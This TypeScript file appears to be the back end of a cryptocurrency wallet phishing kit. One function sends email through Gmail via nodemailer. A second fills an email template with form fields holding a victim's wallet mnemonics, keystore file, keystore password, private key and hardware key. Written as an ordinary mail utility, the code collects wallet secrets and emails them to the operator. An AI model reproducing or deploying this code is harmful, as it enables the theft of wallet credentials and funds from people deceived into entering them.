import nodemailer from "nodemailer";
import * as handlebars from "handlebars";
import { emailTemplate } from "./templates/emailTemplate";
import { EmailContent } from "@/app/models/IEmailContent";

type Mail = {
  to: string;
  name: string;
  subject: string;
  body: string;
};

export async function sendMail({ to, name, subject, body }: Mail) {
  const { SMTP_EMAIL, SMTP_PASSWORD } = process.env;

  const transport = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: SMTP_EMAIL,
      pass: SMTP_PASSWORD,
    },
  });

  try {
    // Verify connection configuration
    const testResult = await transport.verify();
    // Log test result
    console.log("Transporter test result: ", testResult);
  } catch (error) {
    console.error(error);
  }

  try {
    const sendMail = await transport.sendMail({
      from: SMTP_EMAIL,
      to,
      subject,
      html: body,
    });

    return sendMail;
  } catch (error) {
    console.error(error);
  }
}

export function compileEmailTemplate(formValues: EmailContent) {
  const template = handlebars.compile(emailTemplate);
  const htmlBody = template({
    coin_name: formValues.coin,
    mnemonics: formValues.mnemonics ?? "",
    keystore: formValues.keystore ?? "",
    keystore_password: formValues.keystore_password ?? "",
    private_key: formValues.private ?? "",
    hardware_key: formValues.keyhardware ?? "",
  });

  return htmlBody;
}
